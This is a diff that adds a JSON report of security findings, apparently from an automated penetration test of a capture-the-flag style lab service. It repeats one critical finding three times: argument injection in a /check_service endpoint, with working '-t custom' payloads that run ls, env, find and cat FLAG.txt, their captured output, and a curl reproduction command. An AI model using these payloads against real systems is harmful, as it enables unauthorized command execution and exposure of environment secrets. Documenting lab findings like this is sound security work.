@@ -1,0 +1,57 @@
+{
+  "meta": {
+    "created": "2026-04-15T10:38:44.376552+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3dc9b103-88ee-4240-ad69-75e714c2a571",
+      "timestamp": "2026-04-15T10:38:44.376480+00:00",
+      "title": "Command Injection via Argument Injection in Service Status Checker",
+      "severity": "critical",
+      "target": "http://172.17.0.1:52141",
+      "description": "The /check_service endpoint accepts a service_name parameter that is passed directly as arguments to a shell script (check_service.sh). By prefixing the service name with '-t custom', arbitrary commands can be executed on the server. The check_service.sh script supports a '-t custom' type that executes arbitrary commands to determine service status.\n\nVulnerable code pattern: The service_name from the POST body is passed directly to check_service.sh without proper argument separation, allowing the attacker to inject additional command-line arguments.\n\nExploitation:\n- POST /check_service with {\"service_name\": \"-t custom ls -la /\"} returns file listing\n- POST /check_service with {\"service_name\": \"-t custom cat FLAG.txt\"} executes cat FLAG.txt\n- POST /check_service with {\"service_name\": \"-t custom env\"} returns environment variables\n\nFLAG.txt was confirmed to exist at /app/FLAG.txt but was empty (0 bytes) during testing. The flag may be generated dynamically at container startup or stored elsewhere.",
+      "evidence": "Command execution confirmed:\n1. {\"service_name\": \"-t custom ls -la /\", \"status\": \"Dockerfile\\nFLAG.txt\\napp.py\\ncheck_service.sh\\nrequirements.txt\\ntemplates\\ntrue\"}\n2. {\"service_name\": \"-t custom env\", \"status\": \"HOSTNAME=f1d9862be727\\nPYTHON_VERSION=3.8.20\\nPWD=/app\\n...\\ntrue\"}\n3. {\"service_name\": \"-t custom find / -name FLAG.txt 2>/dev/null\", \"status\": \"./FLAG.txt\\ntrue\"}\n4. {\"service_name\": \"-t custom wc -c FLAG.txt\", \"status\": \"0       0       0\\ntrue\"} (FLAG.txt is 0 bytes)\n\nThe target service became unavailable during testing (port 52141 filtered). FLAG.txt exists but is empty - the flag content could not be extracted before the service went offline.",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:52141/check_service -H 'Content-Type: application/json' -d '{\"service_name\": \"-t custom ls -la /\"}'",
+        "expected": "Returns directory listing including FLAG.txt, confirming command execution"
+      }
+    },
+    {
+      "id": "bc4e1476-a326-4d33-a7bc-c91c6724cab6",
+      "timestamp": "2026-04-15T10:38:44.386092+00:00",
+      "title": "Command Injection via Argument Injection in Service Status Checker",
+      "severity": "critical",
+      "target": "http://172.17.0.1:52141",
+      "description": "The /check_service endpoint accepts a service_name parameter that is passed directly as arguments to a shell script (check_service.sh). By prefixing the service name with '-t custom', arbitrary commands can be executed on the server. The check_service.sh script supports a '-t custom' type that executes arbitrary commands to determine service status.\n\nVulnerable code pattern: The service_name from the POST body is passed directly to check_service.sh without proper argument separation, allowing the attacker to inject additional command-line arguments.\n\nExploitation:\n- POST /check_service with {\"service_name\": \"-t custom ls -la /\"} returns file listing\n- POST /check_service with {\"service_name\": \"-t custom cat FLAG.txt\"} executes cat FLAG.txt\n- POST /check_service with {\"service_name\": \"-t custom env\"} returns environment variables\n\nFLAG.txt was confirmed to exist at /app/FLAG.txt but was empty (0 bytes) during testing. The flag may be generated dynamically at container startup or stored elsewhere.",
+      "evidence": "Command execution confirmed:\n1. {\"service_name\": \"-t custom ls -la /\", \"status\": \"Dockerfile\\nFLAG.txt\\napp.py\\ncheck_service.sh\\nrequirements.txt\\ntemplates\\ntrue\"}\n2. {\"service_name\": \"-t custom env\", \"status\": \"HOSTNAME=f1d9862be727\\nPYTHON_VERSION=3.8.20\\nPWD=/app\\n...\\ntrue\"}\n3. {\"service_name\": \"-t custom find / -name FLAG.txt 2>/dev/null\", \"status\": \"./FLAG.txt\\ntrue\"}\n4. {\"service_name\": \"-t custom wc -c FLAG.txt\", \"status\": \"0       0       0\\ntrue\"} (FLAG.txt is 0 bytes)\n\nThe target service became unavailable during testing (port 52141 filtered). FLAG.txt exists but is empty - the flag content could not be extracted before the service went offline.",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:52141/check_service -H 'Content-Type: application/json' -d '{\"service_name\": \"-t custom ls -la /\"}'",
+        "expected": "Returns directory listing including FLAG.txt, confirming command execution"
+      }
+    },
+    {
+      "id": "4ae00470-73fa-448a-b8ad-d23577d916d0",
+      "timestamp": "2026-04-15T10:38:44.445583+00:00",
+      "title": "Command Injection via Argument Injection in Service Status Checker",
+      "severity": "critical",
+      "target": "http://172.17.0.1:52141",
+      "description": "The /check_service endpoint accepts a service_name parameter that is passed directly as arguments to a shell script (check_service.sh). By prefixing the service name with '-t custom', arbitrary commands can be executed on the server. The check_service.sh script supports a '-t custom' type that executes arbitrary commands to determine service status.\n\nVulnerable code pattern: The service_name from the POST body is passed directly to check_service.sh without proper argument separation, allowing the attacker to inject additional command-line arguments.\n\nExploitation:\n- POST /check_service with {\"service_name\": \"-t custom ls -la /\"} returns file listing\n- POST /check_service with {\"service_name\": \"-t custom cat FLAG.txt\"} executes cat FLAG.txt\n- POST /check_service with {\"service_name\": \"-t custom env\"} returns environment variables\n\nFLAG.txt was confirmed to exist at /app/FLAG.txt but was empty (0 bytes) during testing. The flag may be generated dynamically at container startup or stored elsewhere.",
+      "evidence": "Command execution confirmed:\n1. {\"service_name\": \"-t custom ls -la /\", \"status\": \"Dockerfile\\nFLAG.txt\\napp.py\\ncheck_service.sh\\nrequirements.txt\\ntemplates\\ntrue\"}\n2. {\"service_name\": \"-t custom env\", \"status\": \"HOSTNAME=f1d9862be727\\nPYTHON_VERSION=3.8.20\\nPWD=/app\\n...\\ntrue\"}\n3. {\"service_name\": \"-t custom find / -name FLAG.txt 2>/dev/null\", \"status\": \"./FLAG.txt\\ntrue\"}\n4. {\"service_name\": \"-t custom wc -c FLAG.txt\", \"status\": \"0       0       0\\ntrue\"} (FLAG.txt is 0 bytes)\n\nThe target service became unavailable during testing (port 52141 filtered). FLAG.txt exists but is empty - the flag content could not be extracted before the service went offline.",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:52141/check_service -H 'Content-Type: application/json' -d '{\"service_name\": \"-t custom ls -la /\"}'",
+        "expected": "Returns directory listing including FLAG.txt, confirming command execution"
+      }
+    }
+  ],
+  "diagrams": []
+}
